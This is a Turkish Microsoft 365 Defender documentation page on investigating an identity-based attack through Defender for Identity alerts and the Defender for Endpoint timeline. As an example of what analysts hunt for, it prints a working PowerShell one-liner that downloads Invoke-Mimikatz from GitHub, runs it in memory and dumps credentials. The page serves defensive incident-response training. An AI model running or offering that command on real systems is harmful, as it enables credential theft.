---
title: Kimlik tabanlı saldırı örneği
description: Kimlik tabanlı bir saldırının örnek analizinde adım adım ilerleyin.
keywords: olaylar, uyarılar, araştırma, bağıntı, saldırı, makineler, cihazlar, kullanıcılar, kimlikler, kimlik, posta kutusu, e-posta, 365, Microsoft, m365, olay yanıtı, siber saldırı
search.product: eADQiWindows 10XVcnh
ms.service: microsoft-365-security
ms.subservice: m365d
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- m365-security
- m365solution-firstincident
- highpri
- tier1
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.openlocfilehash: ffdc0e6731ae610a1a2184c6b7b5523dd1a73afa
ms.sourcegitcommit: 12af9e8e3a6eaa090fda9e98ccb831dff65863a4
ms.translationtype: MT
ms.contentlocale: tr-TR
ms.lasthandoff: 09/27/2022
ms.locfileid: "68048890"
---
# <a name="example-of-an-identity-based-attack"></a>Kimlik tabanlı saldırı örneği

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Şunlar için geçerlidir:**
- Microsoft 365 Defender

Kimlik için Microsoft Defender, kuruluşunuzdaki kimlikleri tehlikeye atmaya yönelik kötü amaçlı girişimleri algılamaya yardımcı olabilir. Kimlik için Defender Microsoft 365 Defender ile tümleştirildiğinden güvenlik analistleri, Şüpheli Netlogon ayrıcalık yükseltme girişimleri gibi Kimlik için Defender'dan gelen tehditleri görebilir.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Kimlik için Microsoft Defender'de saldırıyı analiz etme

Microsoft 365 Defender analistlerin uyarıları olaylar sayfasının **Uyarılar** sekmesindeki algılama kaynağına göre filtrelemesine olanak tanır. Aşağıdaki örnekte algılama kaynağı **Kimlik için Defender** olarak filtrelenmiştir. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Kimlik için Microsoft Defender'de algılama kaynağını filtreleme" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

**Şüpheli karma saldırı üst geçidi** uyarısı seçildiğinde, Microsoft Defender for Cloud Apps daha ayrıntılı bilgiler görüntüleyen bir sayfaya gider. Saldırının açıklamasını ve düzeltme önerilerini okumak için **Bu uyarı türü hakkında daha fazla bilgi edinin'i** seçerek her zaman bir uyarı veya [saldırı](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) hakkında daha fazla bilgi edinebilirsiniz.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Şüpheli bir karmayı aşarak saldırı uyarısı" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Uç Nokta için Microsoft Defender'de aynı saldırıyı araştırma

Alternatif olarak, bir analist uç nokta üzerindeki etkinlik hakkında daha fazla bilgi edinmek için Uç Nokta için Defender'ı kullanabilir. Olay kuyruğundan olayı seçin ve ardından **Uyarılar** sekmesini seçin. Buradan, algılama kaynağını da tanımlayabilirler. EDR olarak etiketlenmiş bir algılama kaynağı, Uç Nokta için Defender olan Uç Nokta Algılama ve Yanıt anlamına gelir. Analist buradan EDR tarafından algılanan bir uyarıyı seçer.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Uç Nokta için Microsoft Defender portalında Uç Nokta Algılama ve Yanıt" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::

Uyarı sayfasında etkilenen cihaz adı, kullanıcı adı, otomatik araştırmanın durumu ve uyarı ayrıntıları gibi ilgili çeşitli bilgiler görüntülenir. Uyarı hikayesi, işlem ağacının görsel bir gösterimini gösterir. İşlem ağacı, uyarıyla ilgili üst ve alt işlemlerin hiyerarşik bir gösterimidir.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Uç Nokta için Microsoft Defender bir uyarı işlemi ağacı" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

Her işlem daha fazla ayrıntı görüntülemek için genişletilebilir. Analistin görebileceği ayrıntılar, kötü amaçlı bir betiğin parçası olarak girilen gerçek komutlar, giden bağlantı IP adresleri ve diğer yararlı bilgilerdir.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Uç Nokta için Microsoft Defender portalındaki işlem ayrıntıları" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
**Zaman çizelgesinde görüntüle'yi** seçerek analist, güvenliğin tam zamanını belirlemek için daha da detaya gidebilir. 

Uç Nokta için Microsoft Defender birçok kötü amaçlı dosyayı ve betikleri algılayabilir. Ancak, giden bağlantılar, PowerShell ve komut satırı etkinliği için birçok meşru kullanım nedeniyle, bazı etkinlikler kötü amaçlı bir dosya veya etkinlik oluşturana kadar zararsız olarak kabul edilir. Bu nedenle, zaman çizelgesini kullanmak analistlerin uyarıyı çevresindeki etkinlikle bağlam içine alarak aksi takdirde ortak dosya sistemi ve kullanıcı etkinliği tarafından gizlenen saldırının özgün kaynağını veya zamanını belirlemesine yardımcı olur. 

Zaman çizelgesini kullanmak için bir analist uyarı algılama sırasında (kırmızı) başlar ve kötü amaçlı etkinliğe yol açan özgün etkinliğin gerçekte ne zaman başladığını belirlemek için geriye doğru aşağı kaydırır. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Uyarı algılama için analistin başlangıç zamanı" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

Windows Update bağlantıları, Windows Güvenilen Yazılım etkinleştirme trafiği, Microsoft sitelerine yönelik diğer yaygın bağlantılar, üçüncü taraf İnternet etkinliği, Microsoft Endpoint Configuration Manager etkinliği ve diğer zararsız etkinlikler gibi ortak etkinlikleri şüpheli etkinliklerden anlamak ve ayırt etmek önemlidir. Ayırt etmenin bir yolu zaman çizelgesi filtrelerini kullanmaktır. Analistin görüntülemek istemediği bir şeyi filtrelerken belirli etkinlikleri vurgulayan birçok filtre vardır. 

Aşağıdaki görüntüde analist yalnızca ağ ve işlem olaylarını görüntülemek için filtre uygulamıştı. Bu filtre ölçütü analistin, Not Defteri'nin işlem ağacında da gördüğümüz bir IP adresiyle bağlantı kurduğu olayı çevreleyen ağ bağlantılarını ve işlemlerini görmesine olanak tanır. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Kötü amaçlı giden bağlantı oluşturmak için Not Defteri nasıl kullanıldı?" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

Bu özel olayda, kötü amaçlı bir giden bağlantı oluşturmak için Not Defteri kullanılmıştır. Ancak saldırganlar genellikle iexplorer.exe kullanarak kötü amaçlı yük indirmek için bağlantılar kurar çünkü normalde iexplorer.exe işlemler normal web tarayıcısı etkinliği olarak kabul edilir.

Zaman çizelgesinde aranacak başka bir öğe de PowerShell'in giden bağlantılar için kullanması olabilir. Analist, kötü amaçlı bir dosyayı barındıran bir web sitesine giden bağlantı gibi `IEX (New-Object Net.Webclient)` komutlarla başarılı PowerShell bağlantıları arar. 

Aşağıdaki örnekte, Bir web sitesinden Mimikatz'ı indirmek ve yürütmek için PowerShell kullanılmıştır:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Analist, yalnızca PowerShell ile oluşturulan olayları görüntülemek için arama çubuğuna anahtar sözcüğü yazarak anahtar sözcükleri hızla arayabilir. 

## <a name="next-step"></a>Sonraki adım

[Kimlik avı](first-incident-path-phishing.md) araştırma yoluna bakın.

## <a name="see-also"></a>Ayrıca bkz.

- [Olaylara genel bakış](incidents-overview.md)
- [Olayları yönetin](manage-incidents.md)
- [Olayları araştırın](investigate-incidents.md)
